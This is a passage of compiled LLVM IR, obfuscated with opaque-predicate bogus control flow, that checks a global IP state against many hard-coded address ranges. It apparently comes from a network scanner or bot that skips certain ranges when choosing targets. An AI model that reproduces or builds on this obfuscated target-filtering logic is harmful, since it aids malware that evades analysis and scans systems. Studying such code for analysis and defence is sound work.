; <label>:3190:                                   ; preds = %3186, %3182, %3178, %3174
  %3191 = load i32, i32* @x.69
  %3192 = load i32, i32* @y.70
  %3193 = sub i32 %3191, 1
  %3194 = mul i32 %3191, %3193
  %3195 = urem i32 %3194, 2
  %3196 = icmp eq i32 %3195, 0
  %3197 = icmp slt i32 %3192, 10
  %3198 = or i1 %3196, %3197
  br i1 %3198, label %originalBB440, label %originalBB440alteredBB

originalBB440:                                    ; preds = %originalBB440alteredBB, %3190
  %3199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3200 = zext i8 %3199 to i32
  %3201 = icmp eq i32 %3200, 66
  %3202 = load i32, i32* @x.69
  %3203 = load i32, i32* @y.70
  %3204 = sub i32 %3202, 1
  %3205 = mul i32 %3202, %3204
  %3206 = urem i32 %3205, 2
  %3207 = icmp eq i32 %3206, 0
  %3208 = icmp slt i32 %3203, 10
  %3209 = or i1 %3207, %3208
  br i1 %3209, label %originalBBpart2442, label %originalBB440alteredBB

originalBBpart2442:                               ; preds = %originalBB440
  br i1 %3201, label %3210, label %3222

; <label>:3210:                                   ; preds = %originalBBpart2442
  %3211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3212 = zext i8 %3211 to i32
  %3213 = icmp eq i32 %3212, 151
  br i1 %3213, label %3214, label %3222

; <label>:3214:                                   ; preds = %3210
  %3215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3216 = zext i8 %3215 to i32
  %3217 = icmp sge i32 %3216, 137
  br i1 %3217, label %3218, label %3222

; <label>:3218:                                   ; preds = %3214
  %3219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3220 = zext i8 %3219 to i32
  %3221 = icmp slt i32 %3220, 139
  br i1 %3221, label %4994, label %3222

; <label>:3222:                                   ; preds = %3218, %3214, %3210, %originalBBpart2442
  %3223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3224 = zext i8 %3223 to i32
  %3225 = icmp eq i32 %3224, 64
  br i1 %3225, label %3226, label %3238

; <label>:3226:                                   ; preds = %3222
  %3227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3228 = zext i8 %3227 to i32
  %3229 = icmp eq i32 %3228, 94
  br i1 %3229, label %3230, label %3238

; <label>:3230:                                   ; preds = %3226
  %3231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3232 = zext i8 %3231 to i32
  %3233 = icmp sge i32 %3232, 237
  br i1 %3233, label %3234, label %3238

; <label>:3234:                                   ; preds = %3230
  %3235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3236 = zext i8 %3235 to i32
  %3237 = icmp slt i32 %3236, 255
  br i1 %3237, label %4994, label %3238

; <label>:3238:                                   ; preds = %3234, %3230, %3226, %3222
  %3239 = load i32, i32* @x.69
  %3240 = load i32, i32* @y.70
  %3241 = sub i32 %3239, 1
  %3242 = mul i32 %3239, %3241
  %3243 = urem i32 %3242, 2
  %3244 = icmp eq i32 %3243, 0
  %3245 = icmp slt i32 %3240, 10
  %3246 = or i1 %3244, %3245
  br i1 %3246, label %originalBB444, label %originalBB444alteredBB

originalBB444:                                    ; preds = %originalBB444alteredBB, %3238
  %3247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3248 = zext i8 %3247 to i32
  %3249 = icmp eq i32 %3248, 63
  %3250 = load i32, i32* @x.69
  %3251 = load i32, i32* @y.70
  %3252 = sub i32 %3250, 1
  %3253 = mul i32 %3250, %3252
  %3254 = urem i32 %3253, 2
  %3255 = icmp eq i32 %3254, 0
  %3256 = icmp slt i32 %3251, 10
  %3257 = or i1 %3255, %3256
  br i1 %3257, label %originalBBpart2446, label %originalBB444alteredBB

originalBBpart2446:                               ; preds = %originalBB444
  br i1 %3249, label %3258, label %3318

; <label>:3258:                                   ; preds = %originalBBpart2446
  %3259 = load i32, i32* @x.69
  %3260 = load i32, i32* @y.70
  %3261 = sub i32 %3259, 1
  %3262 = mul i32 %3259, %3261
  %3263 = urem i32 %3262, 2
  %3264 = icmp eq i32 %3263, 0
  %3265 = icmp slt i32 %3260, 10
  %3266 = or i1 %3264, %3265
  br i1 %3266, label %originalBB448, label %originalBB448alteredBB

originalBB448:                                    ; preds = %originalBB448alteredBB, %3258
  %3267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3268 = zext i8 %3267 to i32
  %3269 = icmp eq i32 %3268, 251
  %3270 = load i32, i32* @x.69
  %3271 = load i32, i32* @y.70
  %3272 = sub i32 %3270, 1
  %3273 = mul i32 %3270, %3272
  %3274 = urem i32 %3273, 2
  %3275 = icmp eq i32 %3274, 0
  %3276 = icmp slt i32 %3271, 10
  %3277 = or i1 %3275, %3276
  br i1 %3277, label %originalBBpart2450, label %originalBB448alteredBB

originalBBpart2450:                               ; preds = %originalBB448
  br i1 %3269, label %3278, label %3318

; <label>:3278:                                   ; preds = %originalBBpart2450
  %3279 = load i32, i32* @x.69
  %3280 = load i32, i32* @y.70
  %3281 = sub i32 %3279, 1
  %3282 = mul i32 %3279, %3281
  %3283 = urem i32 %3282, 2
  %3284 = icmp eq i32 %3283, 0
  %3285 = icmp slt i32 %3280, 10
  %3286 = or i1 %3284, %3285
  br i1 %3286, label %originalBB452, label %originalBB452alteredBB

originalBB452:                                    ; preds = %originalBB452alteredBB, %3278
  %3287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3288 = zext i8 %3287 to i32
  %3289 = icmp sge i32 %3288, 19
  %3290 = load i32, i32* @x.69
  %3291 = load i32, i32* @y.70
  %3292 = sub i32 %3290, 1
  %3293 = mul i32 %3290, %3292
  %3294 = urem i32 %3293, 2
  %3295 = icmp eq i32 %3294, 0
  %3296 = icmp slt i32 %3291, 10
  %3297 = or i1 %3295, %3296
  br i1 %3297, label %originalBBpart2454, label %originalBB452alteredBB

originalBBpart2454:                               ; preds = %originalBB452
  br i1 %3289, label %3298, label %3318

; <label>:3298:                                   ; preds = %originalBBpart2454
  %3299 = load i32, i32* @x.69
  %3300 = load i32, i32* @y.70
  %3301 = sub i32 %3299, 1
  %3302 = mul i32 %3299, %3301
  %3303 = urem i32 %3302, 2
  %3304 = icmp eq i32 %3303, 0
  %3305 = icmp slt i32 %3300, 10
  %3306 = or i1 %3304, %3305
  br i1 %3306, label %originalBB456, label %originalBB456alteredBB

originalBB456:                                    ; preds = %originalBB456alteredBB, %3298
  %3307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3308 = zext i8 %3307 to i32
  %3309 = icmp slt i32 %3308, 21
  %3310 = load i32, i32* @x.69
  %3311 = load i32, i32* @y.70
  %3312 = sub i32 %3310, 1
  %3313 = mul i32 %3310, %3312
  %3314 = urem i32 %3313, 2
  %3315 = icmp eq i32 %3314, 0
  %3316 = icmp slt i32 %3311, 10
  %3317 = or i1 %3315, %3316
  br i1 %3317, label %originalBBpart2458, label %originalBB456alteredBB

originalBBpart2458:                               ; preds = %originalBB456
  br i1 %3309, label %4994, label %3318

; <label>:3318:                                   ; preds = %originalBBpart2458, %originalBBpart2454, %originalBBpart2450, %originalBBpart2446
  %3319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3320 = zext i8 %3319 to i32
  %3321 = icmp eq i32 %3320, 70
  br i1 %3321, label %3322, label %3350

; <label>:3322:                                   ; preds = %3318
  %3323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3324 = zext i8 %3323 to i32
  %3325 = icmp eq i32 %3324, 42
  br i1 %3325, label %3326, label %3350

; <label>:3326:                                   ; preds = %3322
  %3327 = load i32, i32* @x.69
  %3328 = load i32, i32* @y.70
  %3329 = sub i32 %3327, 1
  %3330 = mul i32 %3327, %3329
  %3331 = urem i32 %3330, 2
  %3332 = icmp eq i32 %3331, 0
  %3333 = icmp slt i32 %3328, 10
  %3334 = or i1 %3332, %3333
  br i1 %3334, label %originalBB460, label %originalBB460alteredBB

originalBB460:                                    ; preds = %originalBB460alteredBB, %3326
  %3335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3336 = zext i8 %3335 to i32
  %3337 = icmp sge i32 %3336, 73
  %3338 = load i32, i32* @x.69
  %3339 = load i32, i32* @y.70
  %3340 = sub i32 %3338, 1
  %3341 = mul i32 %3338, %3340
  %3342 = urem i32 %3341, 2
  %3343 = icmp eq i32 %3342, 0
  %3344 = icmp slt i32 %3339, 10
  %3345 = or i1 %3343, %3344
  br i1 %3345, label %originalBBpart2462, label %originalBB460alteredBB

originalBBpart2462:                               ; preds = %originalBB460
  br i1 %3337, label %3346, label %3350

; <label>:3346:                                   ; preds = %originalBBpart2462
  %3347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3348 = zext i8 %3347 to i32
  %3349 = icmp slt i32 %3348, 75
  br i1 %3349, label %4994, label %3350

; <label>:3350:                                   ; preds = %3346, %originalBBpart2462, %3322, %3318
  %3351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3352 = zext i8 %3351 to i32
  %3353 = icmp eq i32 %3352, 74
  br i1 %3353, label %3354, label %3398

; <label>:3354:                                   ; preds = %3350
  %3355 = load i32, i32* @x.69
  %3356 = load i32, i32* @y.70
  %3357 = sub i32 %3355, 1
  %3358 = mul i32 %3355, %3357
  %3359 = urem i32 %3358, 2
  %3360 = icmp eq i32 %3359, 0
  %3361 = icmp slt i32 %3356, 10
  %3362 = or i1 %3360, %3361
  br i1 %3362, label %originalBB464, label %originalBB464alteredBB

originalBB464:                                    ; preds = %originalBB464alteredBB, %3354
  %3363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3364 = zext i8 %3363 to i32
  %3365 = icmp eq i32 %3364, 91
  %3366 = load i32, i32* @x.69
  %3367 = load i32, i32* @y.70
  %3368 = sub i32 %3366, 1
  %3369 = mul i32 %3366, %3368
  %3370 = urem i32 %3369, 2
  %3371 = icmp eq i32 %3370, 0
  %3372 = icmp slt i32 %3367, 10
  %3373 = or i1 %3371, %3372
  br i1 %3373, label %originalBBpart2466, label %originalBB464alteredBB

originalBBpart2466:                               ; preds = %originalBB464
  br i1 %3365, label %3374, label %3398

; <label>:3374:                                   ; preds = %originalBBpart2466
  %3375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3376 = zext i8 %3375 to i32
  %3377 = icmp sge i32 %3376, 113
  br i1 %3377, label %3378, label %3398

; <label>:3378:                                   ; preds = %3374
  %3379 = load i32, i32* @x.69
  %3380 = load i32, i32* @y.70
  %3381 = sub i32 %3379, 1
  %3382 = mul i32 %3379, %3381
  %3383 = urem i32 %3382, 2
  %3384 = icmp eq i32 %3383, 0
  %3385 = icmp slt i32 %3380, 10
  %3386 = or i1 %3384, %3385
  br i1 %3386, label %originalBB468, label %originalBB468alteredBB

originalBB468:                                    ; preds = %originalBB468alteredBB, %3378
  %3387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3388 = zext i8 %3387 to i32
  %3389 = icmp slt i32 %3388, 115
  %3390 = load i32, i32* @x.69
  %3391 = load i32, i32* @y.70
  %3392 = sub i32 %3390, 1
  %3393 = mul i32 %3390, %3392
  %3394 = urem i32 %3393, 2
  %3395 = icmp eq i32 %3394, 0
  %3396 = icmp slt i32 %3391, 10
  %3397 = or i1 %3395, %3396
  br i1 %3397, label %originalBBpart2470, label %originalBB468alteredBB

originalBBpart2470:                               ; preds = %originalBB468
  br i1 %3389, label %4994, label %3398

; <label>:3398:                                   ; preds = %originalBBpart2470, %3374, %originalBBpart2466, %3350
  %3399 = load i32, i32* @x.69
  %3400 = load i32, i32* @y.70
  %3401 = sub i32 %3399, 1
  %3402 = mul i32 %3399, %3401
  %3403 = urem i32 %3402, 2
  %3404 = icmp eq i32 %3403, 0
  %3405 = icmp slt i32 %3400, 10
  %3406 = or i1 %3404, %3405
  br i1 %3406, label %originalBB472, label %originalBB472alteredBB

originalBB472:                                    ; preds = %originalBB472alteredBB, %3398
  %3407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3408 = zext i8 %3407 to i32
  %3409 = icmp eq i32 %3408, 74
  %3410 = load i32, i32* @x.69
  %3411 = load i32, i32* @y.70
  %3412 = sub i32 %3410, 1
  %3413 = mul i32 %3410, %3412
  %3414 = urem i32 %3413, 2
  %3415 = icmp eq i32 %3414, 0
  %3416 = icmp slt i32 %3411, 10
  %3417 = or i1 %3415, %3416
  br i1 %3417, label %originalBBpart2474, label %originalBB472alteredBB

originalBBpart2474:                               ; preds = %originalBB472
  br i1 %3409, label %3418, label %3446

; <label>:3418:                                   ; preds = %originalBBpart2474
  %3419 = load i32, i32* @x.69
  %3420 = load i32, i32* @y.70
  %3421 = sub i32 %3419, 1
  %3422 = mul i32 %3419, %3421
  %3423 = urem i32 %3422, 2
  %3424 = icmp eq i32 %3423, 0
  %3425 = icmp slt i32 %3420, 10
  %3426 = or i1 %3424, %3425
  br i1 %3426, label %originalBB476, label %originalBB476alteredBB

originalBB476:                                    ; preds = %originalBB476alteredBB, %3418
  %3427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3428 = zext i8 %3427 to i32
  %3429 = icmp eq i32 %3428, 201
  %3430 = load i32, i32* @x.69
  %3431 = load i32, i32* @y.70
  %3432 = sub i32 %3430, 1
  %3433 = mul i32 %3430, %3432
  %3434 = urem i32 %3433, 2
  %3435 = icmp eq i32 %3434, 0
  %3436 = icmp slt i32 %3431, 10
  %3437 = or i1 %3435, %3436
  br i1 %3437, label %originalBBpart2478, label %originalBB476alteredBB

originalBBpart2478:                               ; preds = %originalBB476
  br i1 %3429, label %3438, label %3446

; <label>:3438:                                   ; preds = %originalBBpart2478
  %3439 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3440 = zext i8 %3439 to i32
  %3441 = icmp sge i32 %3440, 56
  br i1 %3441, label %3442, label %3446

; <label>:3442:                                   ; preds = %3438
  %3443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3444 = zext i8 %3443 to i32
  %3445 = icmp slt i32 %3444, 58
  br i1 %3445, label %4994, label %3446

; <label>:3446:                                   ; preds = %3442, %3438, %originalBBpart2478, %originalBBpart2474
  %3447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3448 = zext i8 %3447 to i32
  %3449 = icmp eq i32 %3448, 188
  br i1 %3449, label %3450, label %3462

; <label>:3450:                                   ; preds = %3446
  %3451 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3452 = zext i8 %3451 to i32
  %3453 = icmp eq i32 %3452, 209
  br i1 %3453, label %3454, label %3462

; <label>:3454:                                   ; preds = %3450
  %3455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3456 = zext i8 %3455 to i32
  %3457 = icmp sge i32 %3456, 48
  br i1 %3457, label %3458, label %3462

; <label>:3458:                                   ; preds = %3454
  %3459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3460 = zext i8 %3459 to i32
  %3461 = icmp slt i32 %3460, 53
  br i1 %3461, label %4994, label %3462

; <label>:3462:                                   ; preds = %3458, %3454, %3450, %3446
  %3463 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3464 = zext i8 %3463 to i32
  %3465 = icmp eq i32 %3464, 188
  br i1 %3465, label %3466, label %3470

; <label>:3466:                                   ; preds = %3462
  %3467 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3468 = zext i8 %3467 to i32
  %3469 = icmp eq i32 %3468, 165
  br i1 %3469, label %4994, label %3470

; <label>:3470:                                   ; preds = %3466, %3462
  %3471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3472 = zext i8 %3471 to i32
  %3473 = icmp eq i32 %3472, 149
  br i1 %3473, label %3474, label %3478

; <label>:3474:                                   ; preds = %3470
  %3475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3476 = zext i8 %3475 to i32
  %3477 = icmp eq i32 %3476, 202
  br i1 %3477, label %4994, label %3478

; <label>:3478:                                   ; preds = %3474, %3470
  %3479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3480 = zext i8 %3479 to i32
  %3481 = icmp eq i32 %3480, 151
  br i1 %3481, label %3482, label %3502

; <label>:3482:                                   ; preds = %3478
  %3483 = load i32, i32* @x.69
  %3484 = load i32, i32* @y.70
  %3485 = sub i32 %3483, 1
  %3486 = mul i32 %3483, %3485
  %3487 = urem i32 %3486, 2
  %3488 = icmp eq i32 %3487, 0
  %3489 = icmp slt i32 %3484, 10
  %3490 = or i1 %3488, %3489
  br i1 %3490, label %originalBB480, label %originalBB480alteredBB

originalBB480:                                    ; preds = %originalBB480alteredBB, %3482
  %3491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3492 = zext i8 %3491 to i32
  %3493 = icmp eq i32 %3492, 80
  %3494 = load i32, i32* @x.69
  %3495 = load i32, i32* @y.70
  %3496 = sub i32 %3494, 1
  %3497 = mul i32 %3494, %3496
  %3498 = urem i32 %3497, 2
  %3499 = icmp eq i32 %3498, 0
  %3500 = icmp slt i32 %3495, 10
  %3501 = or i1 %3499, %3500
  br i1 %3501, label %originalBBpart2482, label %originalBB480alteredBB

originalBBpart2482:                               ; preds = %originalBB480
  br i1 %3493, label %4994, label %3502

; <label>:3502:                                   ; preds = %originalBBpart2482, %3478
  %3503 = load i32, i32* @x.69
  %3504 = load i32, i32* @y.70
  %3505 = sub i32 %3503, 1
  %3506 = mul i32 %3503, %3505
  %3507 = urem i32 %3506, 2
  %3508 = icmp eq i32 %3507, 0
  %3509 = icmp slt i32 %3504, 10
  %3510 = or i1 %3508, %3509
  br i1 %3510, label %originalBB484, label %originalBB484alteredBB

originalBB484:                                    ; preds = %originalBB484alteredBB, %3502
  %3511 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3512 = zext i8 %3511 to i32
  %3513 = icmp eq i32 %3512, 164
  %3514 = load i32, i32* @x.69
  %3515 = load i32, i32* @y.70
  %3516 = sub i32 %3514, 1
  %3517 = mul i32 %3514, %3516
  %3518 = urem i32 %3517, 2
  %3519 = icmp eq i32 %3518, 0
  %3520 = icmp slt i32 %3515, 10
  %3521 = or i1 %3519, %3520
  br i1 %3521, label %originalBBpart2486, label %originalBB484alteredBB

originalBBpart2486:                               ; preds = %originalBB484
  br i1 %3513, label %3522, label %3526

; <label>:3522:                                   ; preds = %originalBBpart2486
  %3523 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3524 = zext i8 %3523 to i32
  %3525 = icmp eq i32 %3524, 132
  br i1 %3525, label %4994, label %3526

; <label>:3526:                                   ; preds = %3522, %originalBBpart2486
  %3527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3528 = zext i8 %3527 to i32
  %3529 = icmp eq i32 %3528, 176
  br i1 %3529, label %3530, label %3534

; <label>:3530:                                   ; preds = %3526
  %3531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3532 = zext i8 %3531 to i32
  %3533 = icmp eq i32 %3532, 31
  br i1 %3533, label %4994, label %3534

; <label>:3534:                                   ; preds = %3530, %3526
  %3535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3536 = zext i8 %3535 to i32
  %3537 = icmp eq i32 %3536, 167
  br i1 %3537, label %3538, label %3542

; <label>:3538:                                   ; preds = %3534
  %3539 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3540 = zext i8 %3539 to i32
  %3541 = icmp eq i32 %3540, 114
  br i1 %3541, label %4994, label %3542

; <label>:3542:                                   ; preds = %3538, %3534
  %3543 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3544 = zext i8 %3543 to i32
  %3545 = icmp eq i32 %3544, 178
  br i1 %3545, label %3546, label %3550

; <label>:3546:                                   ; preds = %3542
  %3547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3548 = zext i8 %3547 to i32
  %3549 = icmp eq i32 %3548, 32
  br i1 %3549, label %4994, label %3550

; <label>:3550:                                   ; preds = %3546, %3542
  %3551 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3552 = zext i8 %3551 to i32
  %3553 = icmp eq i32 %3552, 178
  br i1 %3553, label %3554, label %3558

; <label>:3554:                                   ; preds = %3550
  %3555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3556 = zext i8 %3555 to i32
  %3557 = icmp eq i32 %3556, 33
  br i1 %3557, label %4994, label %3558

; <label>:3558:                                   ; preds = %3554, %3550
  %3559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3560 = zext i8 %3559 to i32
  %3561 = icmp eq i32 %3560, 37
  br i1 %3561, label %3562, label %3582

; <label>:3562:                                   ; preds = %3558
  %3563 = load i32, i32* @x.69
  %3564 = load i32, i32* @y.70
  %3565 = sub i32 %3563, 1
  %3566 = mul i32 %3563, %3565
  %3567 = urem i32 %3566, 2
  %3568 = icmp eq i32 %3567, 0
  %3569 = icmp slt i32 %3564, 10
  %3570 = or i1 %3568, %3569
  br i1 %3570, label %originalBB488, label %originalBB488alteredBB

originalBB488:                                    ; preds = %originalBB488alteredBB, %3562
  %3571 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3572 = zext i8 %3571 to i32
  %3573 = icmp eq i32 %3572, 59
  %3574 = load i32, i32* @x.69
  %3575 = load i32, i32* @y.70
  %3576 = sub i32 %3574, 1
  %3577 = mul i32 %3574, %3576
  %3578 = urem i32 %3577, 2
  %3579 = icmp eq i32 %3578, 0
  %3580 = icmp slt i32 %3575, 10
  %3581 = or i1 %3579, %3580
  br i1 %3581, label %originalBBpart2490, label %originalBB488alteredBB

originalBBpart2490:                               ; preds = %originalBB488
  br i1 %3573, label %4994, label %3582

; <label>:3582:                                   ; preds = %originalBBpart2490, %3558
  %3583 = load i32, i32* @x.69
  %3584 = load i32, i32* @y.70
  %3585 = sub i32 %3583, 1
  %3586 = mul i32 %3583, %3585
  %3587 = urem i32 %3586, 2
  %3588 = icmp eq i32 %3587, 0
  %3589 = icmp slt i32 %3584, 10
  %3590 = or i1 %3588, %3589
  br i1 %3590, label %originalBB492, label %originalBB492alteredBB

originalBB492:                                    ; preds = %originalBB492alteredBB, %3582
  %3591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3592 = zext i8 %3591 to i32
  %3593 = icmp eq i32 %3592, 37
  %3594 = load i32, i32* @x.69
  %3595 = load i32, i32* @y.70
  %3596 = sub i32 %3594, 1
  %3597 = mul i32 %3594, %3596
  %3598 = urem i32 %3597, 2
  %3599 = icmp eq i32 %3598, 0
  %3600 = icmp slt i32 %3595, 10
  %3601 = or i1 %3599, %3600
  br i1 %3601, label %originalBBpart2494, label %originalBB492alteredBB

originalBBpart2494:                               ; preds = %originalBB492
  br i1 %3593, label %3602, label %3622

; <label>:3602:                                   ; preds = %originalBBpart2494
  %3603 = load i32, i32* @x.69
  %3604 = load i32, i32* @y.70
  %3605 = sub i32 %3603, 1
  %3606 = mul i32 %3603, %3605
  %3607 = urem i32 %3606, 2
  %3608 = icmp eq i32 %3607, 0
  %3609 = icmp slt i32 %3604, 10
  %3610 = or i1 %3608, %3609
  br i1 %3610, label %originalBB496, label %originalBB496alteredBB

originalBB496:                                    ; preds = %originalBB496alteredBB, %3602
  %3611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3612 = zext i8 %3611 to i32
  %3613 = icmp eq i32 %3612, 187
  %3614 = load i32, i32* @x.69
  %3615 = load i32, i32* @y.70
  %3616 = sub i32 %3614, 1
  %3617 = mul i32 %3614, %3616
  %3618 = urem i32 %3617, 2
  %3619 = icmp eq i32 %3618, 0
  %3620 = icmp slt i32 %3615, 10
  %3621 = or i1 %3619, %3620
  br i1 %3621, label %originalBBpart2498, label %originalBB496alteredBB

originalBBpart2498:                               ; preds = %originalBB496
  br i1 %3613, label %4994, label %3622

; <label>:3622:                                   ; preds = %originalBBpart2498, %originalBBpart2494
  %3623 = load i32, i32* @x.69
  %3624 = load i32, i32* @y.70
  %3625 = sub i32 %3623, 1
  %3626 = mul i32 %3623, %3625
  %3627 = urem i32 %3626, 2
  %3628 = icmp eq i32 %3627, 0
  %3629 = icmp slt i32 %3624, 10
  %3630 = or i1 %3628, %3629
  br i1 %3630, label %originalBB500, label %originalBB500alteredBB

originalBB500:                                    ; preds = %originalBB500alteredBB, %3622
  %3631 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3632 = zext i8 %3631 to i32
  %3633 = icmp eq i32 %3632, 46
  %3634 = load i32, i32* @x.69
  %3635 = load i32, i32* @y.70
  %3636 = sub i32 %3634, 1
  %3637 = mul i32 %3634, %3636
  %3638 = urem i32 %3637, 2
  %3639 = icmp eq i32 %3638, 0
  %3640 = icmp slt i32 %3635, 10
  %3641 = or i1 %3639, %3640
  br i1 %3641, label %originalBBpart2502, label %originalBB500alteredBB

originalBBpart2502:                               ; preds = %originalBB500
  br i1 %3633, label %3642, label %3646

; <label>:3642:                                   ; preds = %originalBBpart2502
  %3643 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3644 = zext i8 %3643 to i32
  %3645 = icmp eq i32 %3644, 105
  br i1 %3645, label %4994, label %3646

; <label>:3646:                                   ; preds = %3642, %originalBBpart2502
  %3647 = load i32, i32* @x.69
  %3648 = load i32, i32* @y.70
  %3649 = sub i32 %3647, 1
  %3650 = mul i32 %3647, %3649
  %3651 = urem i32 %3650, 2
  %3652 = icmp eq i32 %3651, 0
  %3653 = icmp slt i32 %3648, 10
  %3654 = or i1 %3652, %3653
  br i1 %3654, label %originalBB504, label %originalBB504alteredBB

originalBB504:                                    ; preds = %originalBB504alteredBB, %3646
  %3655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3656 = zext i8 %3655 to i32
  %3657 = icmp eq i32 %3656, 51
  %3658 = load i32, i32* @x.69
  %3659 = load i32, i32* @y.70
  %3660 = sub i32 %3658, 1
  %3661 = mul i32 %3658, %3660
  %3662 = urem i32 %3661, 2
  %3663 = icmp eq i32 %3662, 0
  %3664 = icmp slt i32 %3659, 10
  %3665 = or i1 %3663, %3664
  br i1 %3665, label %originalBBpart2506, label %originalBB504alteredBB

originalBBpart2506:                               ; preds = %originalBB504
  br i1 %3657, label %3666, label %3670

; <label>:3666:                                   ; preds = %originalBBpart2506
  %3667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3668 = zext i8 %3667 to i32
  %3669 = icmp eq i32 %3668, 254
  br i1 %3669, label %4994, label %3670

; <label>:3670:                                   ; preds = %3666, %originalBBpart2506
  %3671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3672 = zext i8 %3671 to i32
  %3673 = icmp eq i32 %3672, 51
  br i1 %3673, label %3674, label %3694

; <label>:3674:                                   ; preds = %3670
  %3675 = load i32, i32* @x.69
  %3676 = load i32, i32* @y.70
  %3677 = sub i32 %3675, 1
  %3678 = mul i32 %3675, %3677
  %3679 = urem i32 %3678, 2
  %3680 = icmp eq i32 %3679, 0
  %3681 = icmp slt i32 %3676, 10
